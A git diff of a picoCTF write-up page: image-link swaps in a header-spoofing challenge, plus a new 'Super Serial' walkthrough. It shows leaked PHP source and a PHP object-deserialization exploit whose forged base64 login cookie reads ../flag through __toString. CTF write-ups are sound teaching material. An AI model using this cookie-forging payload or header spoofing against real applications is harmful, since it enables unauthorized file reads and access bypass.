@@ -219,7 +219,7 @@ for i in range(128):
 
 **Stage 1:**
 
-![](../.gitbook/assets/image%20%281%29.png)
+![](../.gitbook/assets/image%20%283%29.png)
 
 This is the only thing I see on the website, Let's look at the hints
 
@@ -231,7 +231,7 @@ So, I have to set special headers for this, After looking through [**Mozilla HTT
 
 **Stage 2:**
 
-![](../.gitbook/assets/image%20%282%29.png)
+![](../.gitbook/assets/image%20%285%29.png)
 
 After changing the header related to the browser, This is what I see. After looking through headers that relate to information regarding the previous site. I found `Referer` I changed it to the same URL.
 
@@ -239,7 +239,7 @@ After changing the header related to the browser, This is what I see. After look
 
 **Stage 3:**
 
-![](../.gitbook/assets/image%20%283%29.png)
+![](../.gitbook/assets/image%20%286%29.png)
 
 After passing the previous stage, Now I see this. It is asking us to visit it from 2018. I know that there is a header for **"Date"**, so I changed it to a date back in 2018.
 
@@ -247,14 +247,14 @@ After passing the previous stage, Now I see this. It is asking us to visit it fr
 
 **Stage 4:**
 
-![](../.gitbook/assets/image%20%285%29.png)
+![](../.gitbook/assets/image%20%284%29.png)
 
 This time I need to set a header for "Do Not Track" which is `DNT`  
 `DNT: 1`
 
 **Stage 5:**
 
-![](../.gitbook/assets/image%20%284%29.png)
+![](../.gitbook/assets/image%20%282%29.png)
 
 This time, We need to access this from Sweden, My first instinct was VPN but so far we only used Headers to reach here. So I looked for another header that may reveal about location, I found `X-Forwarded-For` I changed it to the first IP I found on googling "Sweden IP address"
 
@@ -262,7 +262,7 @@ This time, We need to access this from Sweden, My first instinct was VPN but so 
 
 **Stage 6:**
 
-![](../.gitbook/assets/image%20%286%29.png)
+![](../.gitbook/assets/image%20%288%29.png)
 
 This is an easy one, I need to change the `Accept-Language` header, I set it to `sv-en` 
 
@@ -306,4 +306,150 @@ Like the "Some Assembly Required 1" challenge this is also related to Web Assemb
 This looks like it's encrypted, To figure out the encryption, I used **this website**. It tries all standard XOR decryptions at once. Using `XOR({'option':'Hex','string':'8'},'Standard',false)` the encrypted text outputs: `picoCTF{ef3b0b413475d7c00ee9f1a9b620c7d8}T88T88` , Great!
 
 **Flag:** picoCTF{ef3b0b413475d7c00ee9f1a9b620c7d8}
+
+### Super Serial
+
+**Description:** Try to recover the flag stored on this website
+
+**Points:** 130
+
+#### **Solution**
+
+As soon as you open the website you're prompted with a login screen. There isn't much to see on the login page. Let's have a look at the Hint
+
+{% hint style="info" %}
+**Hint 1:** The flag is at ../flag
+{% endhint %}
+
+So we need to figure out a way to read that file, I tried to brute force for other pages on the URL and found `/robots.txt` 
+
+```text
+User-agent: *
+Disallow: /admin.phps
+```
+
+Notice "admin.**phps**". That is interesting, I tried same extension for index.phps and it revealed the source code. Here's the PHP code for index.php
+
+```php
+<?php
+require_once("cookie.php");
+
+if(isset($_POST["user"]) && isset($_POST["pass"])){
+	$con = new SQLite3("../users.db");
+	$username = $_POST["user"];
+	$password = $_POST["pass"];
+	$perm_res = new permissions($username, $password);
+	if ($perm_res->is_guest() || $perm_res->is_admin()) {
+		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
+		header("Location: authentication.php");
+		die();
+	} else {
+		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
+	}
+}
+?>
+```
+
+As expected from the name it's a deserialization exploit \(see line 10\). Here we can also see two more files. `cookie.php` and `authentication.php` let's look at authentication.phps first.
+
+```php
+<?php
+
+class access_log
+{
+	public $log_file;
+
+	function __construct($lf) {
+		$this->log_file = $lf;
+	}
+
+	function __toString() {
+		return $this->read_log();
+	}
+
+	function append_to_log($data) {
+		file_put_contents($this->log_file, $data, FILE_APPEND);
+	}
+
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+
+require_once("cookie.php");
+if(isset($perm) && $perm->is_admin()){
+	$msg = "Welcome admin";
+	$log = new access_log("access.log");
+	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
+} else {
+	$msg = "Welcome guest";
+}
+?>
+```
+
+Here you can see that class `access_log` contains an interesting function called `__toString()` this is a well know exploit. If you are able to echo the class `access_log` with a file, you can read its contents. So we need to pass the `../flag` in to the `access_log()` and find a place where it's echo'd. Let's look at out last file `cookie.php`
+
+```php
+if(isset($_COOKIE["login"])){
+	try{
+		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+		$g = $perm->is_guest();
+		$a = $perm->is_admin();
+	}
+	catch(Error $e){
+		die("Deserialization error. ".$perm);
+	}
+}
+
+```
+
+ Here's what I found towards the end. It was what we wanted. `$perm` is unserializing the cookie and is echo'd \(`die("Deserialization error. ".$perm);`\) when the functions `is_guest()` and `is_admin()` are not found. So we need to pass `access_log("../flag")` to it. 
+
+First let's serizalize and encode it in base64 so it gives expected output on `unserialize(base64_decode(urldecode()))` 
+
+Here's our exploit
+
+```php
+class access_log
+{
+	public $log_file;
+
+	function __construct($lf) {
+		$this->log_file = $lf;
+	}
+
+	function __toString() {
+		return $this->read_log();
+	}
+
+	function append_to_log($data) {
+		file_put_contents($this->log_file, $data, FILE_APPEND);
+	}
+
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+
+$pwn = new access_log("../flag");
+
+echo urlencode(base64_encode(serialize($pwn)));
+
+// Output: TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+```
+
+The `cookie.php` reads from the cookie `login` so we will set our exploit as
+
+```text
+login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+```
+
+Now let's go to `authentication.php` where the `access_log` class exists.  
+
+
+![](../.gitbook/assets/image%20%281%29.png)
+
+There you go!
+
+**Flag:** picoCTF{th15\_vu1n\_1s\_5up3r\_53r1ous\_y4ll\_66832978}
 
